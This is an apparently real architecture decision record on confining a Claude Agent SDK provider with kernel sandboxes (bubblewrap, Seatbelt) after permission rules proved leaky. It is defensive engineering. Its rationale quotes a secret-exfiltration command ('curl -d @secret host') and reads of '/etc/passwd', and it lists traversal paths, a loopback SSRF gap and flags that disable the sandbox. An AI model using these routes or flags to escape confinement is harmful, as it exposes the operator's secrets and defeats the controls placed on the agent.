# ADR 0001 — Claude Agent SDK as a provider, and what actually confines it

- **Status:** Accepted
- **Date:** 2026-09-08
- **Affects:** `internal/claudesdk/`, `sidecar/claude-sdk-service.js`, `claudesdk.go`, `providers.go`

## Context

We wanted a provider that runs on a Claude **subscription seat** — session
usage — rather than a metered API key, and to expose it as `/claude` in
Telegram.

That goal collides with two standing rules in this repo. The Claude Agent SDK
only bills to a subscription when it runs as the local `claude` CLI under the
operator's OAuth login, which means (a) spawning a subprocess, which the
gateway forbids (`no os/exec`), and (b) reading `~/.claude`, which the
production systemd unit forbids (`ProtectHome=yes`).

Asking "can it reach things outside this repo?" then splits into two quite
different questions, because the SDK provider and every other provider have
completely different filesystem stories.

## Decision

### 1. The SDK runs behind a loopback sidecar, not in-process

`internal/claudesdk` is an HTTP client; `sidecar/claude-sdk-service.js` owns the
`claude` process and the login. This reuses the boundary `internal/coderelay`
already established, so both sandbox layers survive intact and the `no os/exec`
rule holds. Conversation state lives on the SDK side, keyed by a session id the
gateway stores per `(agent, topic)`.

### 2. The SDK is confined by bubblewrap, not by permission rules

This is the part worth recording, because the obvious approach does not work.

**Permission rules cannot confine writes to a directory.** Measured against CLI
2.1.179:

| Configuration | Write outside workspace | Write inside workspace |
|---|---|---|
| Scoped allow `Write(<ws>/**)` only | **leaked** | works |
| Relative allow `Write(./**)` | **leaked** | works |
| Scoped allow + `Write(../**)` deny | **leaked** | works |
| Blanket `Write(//**)` deny | blocked | **also blocked** |

The last row is the trap. `//**` matches *every* absolute path, including the
workspace's own, and deny beats allow with no carve-out — so the only rule that
stops an outside write also locks the agent out of the directory it exists to
use. There is no rule combination that separates the two.

So confinement comes from **bubblewrap**: the filesystem is mounted read-only
and only the workspace is rebound writable. An outside write then fails with
`EROFS` regardless of what the model attempts. Verified: reading `/etc/hostname`,
writing outside the workspace, `../` traversal, and overwriting repo source are
all refused, while in-workspace reads/writes and session resume still work.

Permission rules stay on as defence in depth, and **`Bash` is denied outright**
rather than whitelisted — a shell cannot be confined by path rules at all, since
`cat /etc/passwd` and `curl -d @secret host` bypass every `Read()` rule.

### 2a. macOS uses Seatbelt, because bubblewrap is Linux-only

`bwrap` is built on Linux user namespaces and bind mounts. It does not exist on
macOS and cannot be ported, so a Mac would otherwise get no kernel enforcement —
losing the one layer established above as load-bearing.

macOS ships `/usr/bin/sandbox-exec` (Seatbelt), which expresses the same policy:
allow by default, `(deny file-write*)`, then re-allow `(subpath (param "WS"))`.
The sidecar picks a backend by platform (`SANDBOX_KIND`) and the rest of the
code path is identical.

Two implementation notes worth keeping:

- **Paths are passed as `-D` parameters, never interpolated** into the profile
  text, so a directory containing quotes or parens cannot break out of the
  S-expression.
- **`/tmp` and `/var` must also be named in their `/private` forms.** macOS
  resolves symlinks before matching, and omitting these is the classic reason a
  profile denies writes it appears to allow.

Docker was considered and rejected for this: it would add a Docker Desktop
dependency, contradict the project's no-Docker premise, and — decisively —
require mounting the host's OAuth credentials into the container, where failure
is silent and falls back to API-key billing, the exact outcome this provider
exists to avoid.

**Status: the Seatbelt path is unverified.** It was written and reviewed on
Linux, where it cannot be executed. Run `node sidecar/claude-sdk-service.js
--selftest` on the Mac before relying on it; the command writes inside and
outside a scratch workspace through the real wrapper and exits non-zero unless
the outside write is blocked.

Known caveats on macOS: `sandbox-exec` has carried a deprecation marker for
years while remaining in every release (Chrome and other major tools depend on
it), and Seatbelt does **not** protect Keychain, which is Mach IPC rather than a
file operation — so it constrains the filesystem, not credential access.

### 3. Other providers were already confined — by different means

Gemini, OpenAI, Anthropic, OpenRouter and local models never touch the
filesystem directly. They can only emit tool calls, and every file tool resolves
through `workspace.SafeWorkspace`. Two distinct behaviours, both safe, and both
now covered by tests in `esc_probe_test.go`:

- **Traversal (`../../etc/passwd`) is rejected** with an explicit security error.
- **An absolute path (`/etc/hostname`) is neutralised, not rejected.**
  `filepath.Join` treats it as relative, so it lands nested *inside* the
  workspace at `<ws>/etc/hostname`. Nothing outside is touched.

The second behaviour is easy to misread as a hole — during this work an initial
probe asserted "the call must error" and reported a false escape. The property
that actually matters is *nothing outside the workspace is affected*, and the
tests now assert that (via an untouched canary file) rather than asserting an
error.

## Consequences

**The two provider families have genuinely different threat models.** Non-SDK
providers are confined in-process by Go code we own, to a per-agent workspace.
The SDK provider is confined by the kernel, to whichever directory the sidecar
is handed. Neither inherits the other's protection.

**The OS sandbox is load-bearing.** If no backend is available the sidecar warns
loudly and falls back to rules alone, which do *not* reliably prevent an
out-of-workspace write. Do not remove the wrapper in favour of "simpler"
permission rules; re-run `--selftest` first.

**Platform parity is not symmetric.** Linux is tested; macOS is implemented but
unverified. Anyone running on a Mac should treat `--selftest` as a required step,
not an optional one.

**Confinement is per-workspace, which is stricter than "this repo."** The SDK
cannot write to the project source at all. If repo-scoped work is ever wanted,
that is a deliberate widening, not a bug fix.

**Escape hatches are explicit:** `CLAUDE_NO_BWRAP=1`, `CLAUDE_UNSAFE=1`,
`CLAUDE_WORKSPACE_ROOT=<dir>`.

## Known gaps

- **`web_fetch` is not loopback-filtered.** It correctly rejects `file://` and
  non-HTTP schemes, but a model can still ask it for `http://127.0.0.1:<port>/…`
  and reach a local service (the code relay on 8080, the SDK sidecar on 8081).
  Low severity on a single-user box, and it is read-only GET, but it is a real
  SSRF surface and is not currently blocked.
- **The SDK's session store is outside the gateway's sandbox** by construction —
  it lives in the operator's `~/.claude`, which is why bwrap must keep that path
  writable.
- **The sidecar authenticates nobody.** Anything that can reach loopback can
  spend the subscription. Acceptable for a single-user host; not acceptable if
  the machine is shared.

## Alternatives rejected

- **`os/exec` in the gateway** — breaks the core architectural rule, and fails
  under systemd anyway.
- **Permission rules alone** — measured not to work (table above).
- **Whitelisting a narrow `Bash`** — a shell cannot be path-confined; every
  whitelist leaks via pipes and subshells.
- **`--dangerously-skip-permissions`** — removes the rule layer entirely with
  nothing kernel-level behind it at the time it was considered.
- **Docker for both platforms** — real enforcement and identical behaviour, but
  a heavy new dependency, contrary to the project's premise, and it puts
  subscription billing at risk via the mounted OAuth login.
